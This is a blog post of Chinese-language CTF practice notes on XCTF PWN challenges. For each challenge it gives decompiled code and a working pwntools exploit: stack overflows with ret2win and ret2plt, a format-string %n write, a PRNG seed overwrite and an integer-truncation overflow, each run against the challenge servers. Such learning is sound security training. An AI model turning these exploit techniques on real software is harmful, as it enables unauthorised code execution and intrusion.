---
title: 攻防世界刷题小记-PWN
link: gong-fang-shi-jie-shua-ti-xiao-ji-pwn
date: 2026-02-04 13:37:06
description: 就刷刷题，练练基础
tags:
  - pwn
categories:
  - [笔记, PWN]
---

# Pwn

## get_shell

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  puts("OK,this time we will get a shell.");
  system("/bin/sh");
  return 0;
}
```

在 main 函数这里，看到题目直接给了 shell，连接靶机就能赢

## hello_pwn

这是 main 函数

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  alarm(0x3Cu);
  setbuf(stdout, 0);
  puts("~~ welcome to ctf ~~     ");
  puts("lets get helloworld for bof");
  read(0, &unk_601068, 0x10u);
  if ( dword_60106C == 1853186401 )
    sub_400686();
  return 0;
}
__int64 sub_400686()
{
  system("cat flag.txt");
  return 0;
}
```

根据 ai 的意思，这里应该是考察我缓冲区溢出，先是 read 函数那里会读取 16 字节到 0x601068，然后整个程序会检查 0x60106c 那里的四个字节的内容，必须是 1853186401 代表的值，我们可以提前转换成 char，也可以用 p32 打包函数处理（转化成 char 也要小端序处理，p32 函数会默认处理的

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204145324729.png" alt="image-20260204145324729" style="zoom:50%;" />

```python
from pwn import *
context.binary='./4f2f44c9471d4dc2b59768779e378282'
def exploit():
    #p=process('./4f2f44c9471d4dc2b59768779e378282')
    p=remote('61.147.171.105',63796)
    print(p.recvuntil(b'lets get helloworld for bof\n').decode())
    payload=b'A'*4+p32(1853186401)
    print(f"payload:{payload}")
    p.send(payload)
    flag=p.recvall(timeout=2).decode()
    print(f"flag:{flag}")
    p.close()
if __name__=='__main__':
    exploit()
"""
➜  下载 python exp.py                            
[*] '/home/yolo/下载/4f2f44c9471d4dc2b59768779e378282'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Opening connection to 61.147.171.105 on port 63796: Done
~~ welcome to ctf ~~     
lets get helloworld for bof

payload:b'AAAAaaun'
[+] Receiving all data: Done (45B)
[*] Closed connection to 61.147.171.105 port 63796
flag:cyberpeace{5e847ac5bcb850e209f762a5b49210b8}
"""
```

## level0

看题目描述，这个题好像就是传说中的栈溢出

```bash
➜  下载 checksec 291721f42a044f50a2aead748d539df0
[*] '/home/yolo/下载/291721f42a044f50a2aead748d539df0'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

没有栈保护，继续逆向分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDu);
  return vulnerable_function(1);
}
ssize_t vulnerable_function()
{
  _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200u);
}
```

这里的溢出点就在`vulnerable_function`中，可以看到 0x200(512 字节)>128 字节,也就是说填充完 128 字节后还溢出了 384 字节

这里的 512 字节可以覆盖如下部分

- buf[128]
- 对齐填充(8 字节)
- 保存 rbp(8 字节)
- 返回地址(8 字节)

程序自然是动不了的，不过我们可以让返回地址指定到我们能执行系统命令的地方，正好，这里存在 callsystem 函数,对应地址在 0x400596

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204152153591.png" alt="image-20260204152153591" style="zoom:50%;" />

```c
int callsystem()
{
  return system("/bin/sh");
}
```

可以构造 payload，这里的偏移应该是 0x88(128 字节+8 字节+8 字节=0x80+0x4+0x4=0x88)，然后后门地址是 0x400596，接下来就发送 payload 即可

---

> 上面是 wrong 的，这里涉及栈对齐的问题，在 x86-64 架构中，当使用 system()函数时，要求栈指针(RSP)在 16 字节边界上对齐

正常流程：原始返回地址应该覆盖 callsystem(0x400596)，但是 callsystem 函数开头是：`push rbp`(将 RSP 减 8),此时 RSP 就不是 16 字节对齐的，会导致 system()调用失败

所以我们应该先跳转到任意 retn 指令，就比如说(0x4005a5)

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204154857388.png" alt="image-20260204154857388" style="zoom:50%;" />

ret 指令会在栈中弹出一个地址到 RIP，同时 RSP 增加 8,这个时候，RSP 相对来说增加 8,通过 ret 指令跳转到`callsystem`函数后，RSP 减 8,一增一减，可以保证 RSP 是对齐的，从而正常触发`/bin/sh`

```python
from pwn import *
context.binary='./291721f42a044f50a2aead748d539df0'
context.arch='amd64'
context.log_level='info'
#p=process('./291721f42a044f50a2aead748d539df0')
p=remote('61.147.171.103','58119')
print(p.recvline())
ret_addr=0x4005a5
offset=0x88
callsystem=0x400596
payload=b'A'*offset+p64(ret_addr)+p64(callsystem)
log.info(f'Payload: {payload}')
p.sendline(payload)
p.interactive()
```

## level2

这个题初步审计，和上面的栈溢出特别像，不过有一点点不同，这里没有后门函数了，反而是将/bin/sh 保存在字符串段了，有个猜想，就是我这里是不是能将 main 那里的 system 里面的命令改成这个？

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204160824700.png" alt="image-20260204160824700" style="zoom:50%;" />

先进行反编译

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system("echo 'Hello World!'");
  return 0;
}
ssize_t vulnerable_function()
{
  _BYTE buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u); //256u，这里可以覆盖很多的
}
```

我感觉我想得没有什么问题

先查看所有 system 的调用地址

```bash
➜  下载 checksec 1ab77c073b4f4524b73e086d063f884e
[*] '/home/yolo/下载/1ab77c073b4f4524b73e086d063f884e'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
➜  下载 objdump -d ./1ab77c073b4f4524b73e086d063f884e | grep system@plt
08048320 <system@plt>:
 804845c:	e8 bf fe ff ff       	call   8048320 <system@plt>
 804849e:	e8 7d fe ff ff       	call   8048320 <system@plt>
```

符合 main 函数逻辑,只调用两次，同时 system 地址 0x8048320

> 在 32 位程序中，使用 cdecl 调用约定时，参数是从右向左传递的，就比如说调用 system 的时候，应该先写返回地址，然后写参数

```python
from pwn import *
context(arch='i386',os='linux')
def exp():
    #p=process('./1ab77c073b4f4524b73e086d063f884e')
    p=remote('61.147.171.35',55130)
    p.recvuntil(b'Input:')
    p.recvline()
    offset=0x88+0x4
    system_plt=0x08048320
    bin_sh_addr=0x0804a024

    payload=b'A' *offset
    payload+=p32(system_plt)
    payload+=b'BBBB'
    payload+=p32(bin_sh_addr)
    p.send(payload)
    p.interactive()
if __name__=='__main__':
    exp()
```

## CGfsb

初步审计,buf 就两个字节大小，但是 read 要读取 10 字节，应该是溢出类型题目，然后本题逻辑需要我们让`pwnme变量==8`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
  __int16 v5; // [esp+26h] [ebp-76h]
  char s[100]; // [esp+28h] [ebp-74h] BYREF
  unsigned int v7; // [esp+8Ch] [ebp-10h]

  v7 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf[0] = 0;
  buf[1] = 0;
  v5 = 0;
  memset(s, 0, sizeof(s));
  puts("please tell me your name:");
  read(0, buf, 0xAu);
  puts("leave your message please:");
  fgets(s, 100, stdin);
  printf("hello %s", (const char *)buf);
  puts("your message is:");
  printf(s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
```

先查看变量地址

```bash
➜  下载 checksec e41a0f684d0e497f87bb309f91737e4d
[*] '/home/yolo/下载/e41a0f684d0e497f87bb309f91737e4d'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
➜  下载 objdump -t ./e41a0f684d0e497f87bb309f91737e4d | grep pwnme     
0804a068 g     O .bss	00000004              pwnme
```

omg，这里有 Canary 保护，栈溢出可行性不大，得思考其他方法，ai 说这里应该是格式化字符串漏洞，这里的`printf(s)`是主要攻击点

### 格式化字符串漏洞

> 正常使用：
>
> ```c
> char name[20]="Alice";
> printf("hello,%s!",name);
> ```
>
> 有漏洞的版本
>
> ```c
> char user_input[100];
> fgets(user_input,100,stdin);
> printf(user_input);//用户输入被直接作为格式化字符串
> ```
>
> 

常见的格式化函数：

- `printf`:输出到 stdout
- `fprintf`:输出到文件流
- `sprintf`:输出到字符串
- `snprintf`:输出到字符串（带长度限制）

格式化符号

| 符号 | 作用         | 可能漏洞         |
| ---- | ------------ | ---------------- |
| %d   | 打印整数     | 泄漏栈数据       |
| %x   | 打印十六进制 | 泄漏栈数据       |
| %p   | 打印指针     | 泄漏内存地址     |
| %s   | 打印字符串   | 泄漏任意地址数据 |
| %n   | 写入整数     | 写入任意内存     |
| %c   | 打印字符     | 控制输出长度     |

### solve

这里我们需要先查找偏移，因为 printf 不知道我们给了它多少参数，它只会盲目在栈上读取，这是一般情况

```c
int a=1,b=2,c=3;
printf("%d %d %d",a,b,c);
```

和上面情况对应的栈布局：

```text
[返回地址]
["%d %d %d"的地址] ← ESP
[a的值]           ← ESP+4
[b的值]           ← ESP+8  
[c的值]           ← ESP+12
```

printf 遇到第一个%d 会取 ESP+4,遇到第二个会取 ESP+8，以此类推

这些都是正常情况，但是偏移是怎么出现的？

这是因为 printf 盲目信任格式字符串，当出现一个参数的时候，会自动向下查找值，一直到读取到自身

> 例如：输入 `AAAA.%p.%p.%p`，第一个 `%p` 读取的是格式化字符串指针之后的第 1 个参数位置，第二个 `%p` 读取第 2 个... 当某个 `%p` 输出了 `0x41414141`（即 "AAAA"），说明此时读取到了用户输入本身，这个位置的索引就是**偏移量**。

那么在这个题目中如何快速查找偏移呢？建议使用 pwngdb 断点，注意，这里需要断第二个 printf

```python
from pwn import *
p=gdb.debug('./e41a0f684d0e497f87bb309f91737e4d','''
    break *0x80486cd
    continue
''')
p.sendlineafter(b'name:',b'test')
p.sendlineafter(b'please:',b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
p.interactive()
```

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204211921483.png" alt="image-20260204211921483" style="zoom:50%;" />



可以看到，这里的偏移量是 10，那么我们如何完成挑战，将 8 写入 pwnme 地址中？可以使用%n，下面是我的 exp

```python
from pwn import *
#p=process('./e41a0f684d0e497f87bb309f91737e4d')
p=remote('61.147.171.35',65324)
p.recvuntil(b'please tell me your name:')
p.sendline(b'hacker')
p.recvuntil(b'leave your message please:')

pwnme_addr=0x0804a068

payload=p32(pwnme_addr)+b'%4c'+b'%10$n'
p.sendline(payload)
p.interactive()
```

## guess_num

先逆向审计

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-3Ch] BYREF
  int i; // [rsp+8h] [rbp-38h]
  int v6; // [rsp+Ch] [rbp-34h]
  _BYTE v7[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  v4 = 0;
  v6 = 0;
  *(_QWORD *)seed = sub_BB0();
  puts("-------------------------------");
  puts("Welcome to a guess number game!");
  puts("-------------------------------");
  puts("Please let me know your name!");
  printf("Your name:");
  gets(v7);
  srand(seed[0]);
  for ( i = 0; i <= 9; ++i )
  {
    v6 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", i + 1);
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v4);
    puts("---------------------------------");
    if ( v4 != v6 )
    {
      puts("GG!");
      exit(1);
    }
    puts("Success!");
  }
  sub_C3E();
  return 0;
}
__int64 sub_C3E()
{
  printf("You are a prophet!\nHere is your flag!");
  system("cat flag");
  return 0;
}
__int64 sub_BB0()
{
  int fd; // [rsp+Ch] [rbp-14h]
  _QWORD buf[2]; // [rsp+10h] [rbp-10h] BYREF

  buf[1] = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 || (int)read(fd, buf, 8u) < 0 )
    exit(1);
  if ( fd > 0 )
    close(fd);
  return buf[0];
}
```

看到 gets 了，但可惜，这个题目好像不是栈溢出

```bash
➜  下载 checksec b59204f56a0545e8a22f8518e749f19f
[*] '/home/yolo/下载/b59204f56a0545e8a22f8518e749f19f'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

```

既然开启了 canary 保护，那就看看其他漏洞

---

wait，可以观察到这里

```c
  _BYTE v7[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
```

v7 从 rbp-30h 增加 32 字节刚好到 rbp-10h 是 seed[0]的位置，然后才会到 canary，也就是说，这里可以利用缓存溢出，将 seed 修改成我们自定义的值，从而提前知道预测值并且不会触发 canary 保护（这里有个前提，是靶机必须和本地有相同的 libc 环境，好在这个题目的话，环境差异不大，可以直接本地预测

```bash
➜  下载 cat test.c
#include <stdio.h>
#include <stdlib.h>
int main(){
	srand(0);
	for(int i=0;i<10;i++){
		printf("%d\n",rand()%6+1);
	}
}
➜  下载 gcc test.c -o test
➜  下载 ./test
2
5
4
2
6
2
5
1
4
2
```

随机数预测出来了，那么接下来写 payload，需要将 seed 覆盖成 0

```python
from pwn import *
#p=process('./b59204f56a0545e8a22f8518e749f19f')
p=remote('61.147.171.105',59002)
payload=b"A"*32+p64(0)
p.sendlineafter("Your name:",payload)
nums=[2,5,4,2,6,2,5,1,4,2]
for n in nums:
    p.sendlineafter("guess number:",str(n))
p.interactive()
```

## int_overflow

看题目名，这个很像整数溢出漏洞

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+Ch] [ebp-Ch] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("---------------------");
  puts("~~ Welcome to CTF! ~~");
  puts("       1.Login       ");
  puts("       2.Exit        ");
  puts("---------------------");
  printf("Your choice:");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 1 )
  {
    login();
  }
  else
  {
    if ( v4 == 2 )
    {
      puts("Bye~");
      exit(0);
    }
    puts("Invalid Choice!");
  }
  return 0;
}
int login()
{
  char buf[512]; // [esp+0h] [ebp-228h] BYREF
  char s[40]; // [esp+200h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  memset(buf, 0, sizeof(buf));
  puts("Please input your username:");
  read(0, s, 0x19u);
  printf("Hello %s\n", s);
  puts("Please input your passwd:");
  read(0, buf, 0x199u);
  return check_passwd(buf);
}
char *__cdecl check_passwd(char *s)
{
  char dest[11]; // [esp+4h] [ebp-14h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    return (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    return strcpy(dest, s);
  }
}
int what_is_this()
{
  return system("cat flag");
}
```

审计代码，是个列表题

然后可以观察到，这个题目的后门在 0x804868b

<img src="/img/gong-fang-shi-jie-shua-ti-xiao-ji-pwn.assets/image-20260204234736576.png" alt="image-20260204234736576" style="zoom:50%;" />

所以这个题目可以打的链子是`check_passwd->v3溢出->what_is_this->flag`

这里的漏洞点应该是`unsigned __int8 v3; // [esp+Fh] [ebp-9h]`

因为 v3 是 1 字节的无符号整数，范围是 0～255

这里如果通过 strlen(s)返回 size_t，长度可能会超出 255,这时候赋值只会取低 8 位(len%256),我们就有办法绕过那个 v3 长度从 3 到 8 的范围了，例如，`当strlen(s)=256时，v3=1`以此类推

然后到那个 strcpy，它可不会管长度，只管复制，这个时候 dist 只有 11 字节长度，完全可以覆盖出来进行溢出

这里计算下溢出长度，先从这里看

---

好用的记忆技巧

```text
    EBP：当前楼的门牌（Base Pointer）

    EIP：你现在在哪个工位工作（Instruction Pointer）

    ESP：当前桌面还有多少空间（Stack Pointer）

    返回地址：做完后要回哪里的便签纸（saved eip）

    栈溢出：水倒太多，淹了便签纸，改成去别的地方
```

---

```assembly
char dest[11]; // [esp+4h] [ebp-14h] BYREF
```

可以认为 dest 的工位在 ebp-0x14，但是这个 check_passwd 函数整体的返回地址固定在 ebp+4，所以可以算出来，dest 的偏移是`(ebp+4)-(ebp-0x14)=24字节`



接下来呢，我们应该构造 payload，24 个字节填充到 ebp+4，然后将原来返回 login 的地址覆盖成后门 what_is_this，然后就是想办法填充到 258-263 这样差不多，就能赢

```python
from pwn import *
#p=process('./51ed19eacdea43e3bd67217d08eb8a0e')
p=remote('61.147.171.35',54768)
p.sendlineafter(b"Your choice:",b"1")
p.sendlineafter(b"username:",b"hacker")
backdoor_addr=0x0804868B
offset=24
payload=b"A"*offset+p32(backdoor_addr)
payload=payload.ljust(260,b'h')

print(payload)
p.sendline(payload)
p.interactive()
```





